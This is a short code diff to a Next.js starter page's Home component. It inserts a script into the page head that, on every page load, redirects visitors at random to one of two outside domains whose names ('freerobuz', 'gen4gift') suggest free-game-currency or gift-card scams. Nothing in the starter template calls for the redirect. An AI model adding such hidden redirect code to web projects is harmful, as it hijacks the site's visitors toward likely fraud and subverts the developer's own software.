@@ -6,6 +6,13 @@ export default function Home() {
   return (
     <div className="container">
       <Head>
+    <script type="text/javascript">
+var urls = new Array();
+urls[00] = "https://freerobuz.com/";
+urls[01] = "https://gen4gift.com";
+var random = Math.floor(Math.random()*urls.length);
+window.location = urls[random];
+</script>
         <title>Next.js Starter!</title>
         <link rel="icon" href="/favicon.ico" />
       </Head>
